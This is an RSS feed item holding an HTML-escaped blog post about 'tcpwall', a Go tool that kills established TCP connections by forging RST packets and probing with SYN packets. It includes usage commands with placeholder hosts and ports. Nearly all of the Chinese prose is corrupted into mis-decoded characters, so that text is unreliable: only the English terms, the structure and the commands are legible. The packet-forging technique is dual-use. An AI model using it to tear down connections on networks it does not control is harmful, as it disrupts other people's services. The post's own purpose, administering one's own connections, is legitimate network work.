      <description>&lt;h2 id=&#34;tcpwall&#34;&gt;tcpwall&lt;/h2&gt;
&lt;p&gt;å½“æˆ‘ä»¬æƒ³è¦é˜»æ­¢æŸäº›TCPè¿æ¥çš„å»ºç«‹ï¼Œåœ¨Linuxå¹³å°ä¸Šæœ‰ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆ&lt;strong&gt;iptables&lt;/strong&gt;ï¼Œä½†æ˜¯å¯¹é‚£äº›å·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Œiptableså°±ä¸èƒ½åšåˆ°éšå¿ƒæ‰€æ¬²çš„é˜»æ–­äº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘åœ¨äº’è”ç½‘ä¸Šæ£€ç´¢çš„æ—¶å€™å‘ç°äº†&lt;strong&gt;tcpkill&lt;/strong&gt;è¿™ä¸ªå·¥å…·ï¼Œtcpkillæ˜¯ä¸€ä¸ªç½‘ç»œåˆ†æå·¥å…·é›†&lt;strong&gt;dsniff&lt;/strong&gt;ä¸­çš„ä¸€ä¸ªå°å·¥å…·ã€‚åœ¨Linuxä¸Šå¯ä»¥ç›´æ¥é€šè¿‡dsniffåŒ…å®‰è£…ï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿéå¸¸ç®€å•ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡æµ‹è¯•æˆ‘å‘ç°tcpkillåœ¨æ‰§è¡Œå‘½ä»¤ä¹‹åå¹¶ä¸ä¼šç«‹åˆ»é˜»æ–­tcpè¿æ¥ï¼Œè€Œæ˜¯ç­‰å¾…æœ‰æ•°æ®ä¼ è¾“æ—¶ï¼Œæ‰ä¼šé˜»æ–­ï¼Œå› æ­¤åœ¨æ‰§è¡Œå®Œå‘½ä»¤ä¹‹åç¨‹åºå¹¶ä¸ä¼šä¸»åŠ¨é€€å‡ºï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡&lt;em&gt;&lt;strong&gt;Ctrl+C&lt;/strong&gt;&lt;/em&gt;æ¥é€€å‡ºï¼Œè¿™å¯¹äºæŸäº›æƒ³è¦é€šè¿‡ç¨‹åºæ¥è°ƒç”¨çš„è„šæœ¬å°å­ï¼ˆä¾‹å¦‚æˆ‘ï¼‰æ¥è¯´ç®€ç›´æ˜¯ä¸ªç¾éš¾ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥&#34;&gt;å¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Ÿ&lt;/h2&gt;
&lt;p&gt;é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥é€šå¸¸æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯ä¸»åŠ¨æ–­å¼€&lt;/li&gt;
&lt;li&gt;æ‹”æ‰ç½‘çº¿ï¼ˆæ—¶é—´è¦è¶…è¿‡tcpè¶…æ—¶æ—¶é—´ï¼‰&lt;/li&gt;
&lt;li&gt;ä¼ªé€ RSTæ•°æ®åŒ…å‘é€ç»™æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯è®©å®ƒä»¬ä¸»åŠ¨æ–­å¼€ï¼ˆtcpkillå°±æ˜¯è¿™ä¹ˆåšçš„ï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å‰ä¸‰ç§å±€é™æ€§å¤ªå¤§ï¼Œåªèƒ½ç”¨ç¬¬4ç§äº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¦‚ä½•å®ç°ä¼ªé€ rstæ•°æ®æŠ¥æ–‡åŒ…&#34;&gt;å¦‚ä½•å®ç°ä¼ªé€ RSTæ•°æ®æŠ¥æ–‡åŒ…ï¼Ÿ&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/google/gopacket&#34;&gt;GoPacket&lt;/a&gt; æ˜¯goåŸºäº&lt;strong&gt;libpcap&lt;/strong&gt;æ„å»ºçš„ä¸€ä¸ªåº“ï¼Œå¯ä»¥é€šè¿‡æ—è·¯çš„æ–¹å¼æ¥æ”¶ä¸€ä»½æ•°æ®åŒ…çš„æ‹·è´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿æ•è·åˆ°æ­£åœ¨é€šä¿¡çš„tcpæ•°æ®æŠ¥æ–‡ã€‚é€šè¿‡æ•°æ®æŠ¥æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°é€šä¿¡åŒæ–¹çš„MACåœ°å€ï¼ŒIPå’Œç«¯å£å·ï¼Œä»¥åŠACKå·ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ä¼ªé€ æ•°æ®åŒ…å¿…ä¸å¯å°‘çš„ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å­¦ä¹ äº†&lt;strong&gt;tcpkill&lt;/strong&gt;çš„æºç ä¹‹åï¼Œæˆ‘ä½¿ç”¨goå¼€å‘äº†ä¸€ä¸ªå¢å¼ºç‰ˆçš„&lt;strong&gt;tcpwall&lt;/strong&gt;ï¼Œ&lt;strong&gt;tcpwall&lt;/strong&gt;ä¸ä»…å¯ä»¥å®ç°å’Œ&lt;strong&gt;tcpkill&lt;/strong&gt;åŒæ ·çš„åŸºäºipæˆ–ç«¯å£ç›‘å¬åˆ°æŒ‡å®šæ•°æ®æŠ¥æ–‡ä¹‹åä¼ªé€ RSTæ•°æ®æŠ¥æ–‡æ¥é˜»æ–­tcpè¿æ¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æºipæºç«¯å£ï¼Œç›®çš„ipç›®çš„ç«¯å£æ¥ä¸»åŠ¨å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…æ¥è¯±å¯¼é‚£äº›æ²¡æœ‰æ•°æ®çš„tcpè¿æ¥å‘é€ACKæ•°æ®æŠ¥æ–‡åŒ…ä»¥è·å–æºMACã€ç›®çš„MACå’ŒACKå·ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•°è®©ç¨‹åºç­‰å¾…ä¸€æ®µæ—¶é—´åä¸»åŠ¨é€€å‡ºã€‚&lt;/p&gt;
&lt;h2 id=&#34;å¦‚ä½•ä½¿ç”¨&#34;&gt;å¦‚ä½•ä½¿ç”¨&lt;/h2&gt;
&lt;p&gt;é˜»æ–­æŒ‡å®šIPå’Œç«¯å£çš„TCPè¿æ¥ï¼ˆä¸å…³å¿ƒæ˜¯æºæˆ–è€…ç›®çš„ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpwall -i &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -host &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -port &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;port&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é˜»æ–­æŒ‡å®šæºIPå’Œæºç«¯å£çš„TCPè¿æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpwall -i &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -shost &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;src_host&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -sport &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;src_port&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é˜»æ–­æŒ‡å®šç›®çš„IPå’Œç›®çš„ç«¯å£çš„TCPè¿æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpwall -i &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -dhost &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;dst_host&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -dport &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;dst_port&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é˜»æ–­æŒ‡å®šæºIPã€æºç«¯å£ã€ç›®çš„IPã€ç›®çš„ç«¯å£çš„TCPè¿æ¥ï¼ˆä¼šä¸»åŠ¨å‘åŒæ–¹å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpwall -i &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -shost &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;src_host&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -sport &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;src_port&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -dhost &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;dst_host&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; -dport &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;dst_port&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;å…¶ä»–&#34;&gt;å…¶ä»–&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;-timeout æ—¶é—´ï¼ˆç§’ï¼‰æŒ‡å®šç­‰å¾…å¤šä¹…ä¹‹åé€€å‡ºç¨‹åº&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é¡¹ç›®åœ°å€ &lt;a href=&#34;https://github.com/dushixiang/tcpwall&#34;&gt;https://github.com/dushixiang/tcpwall&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
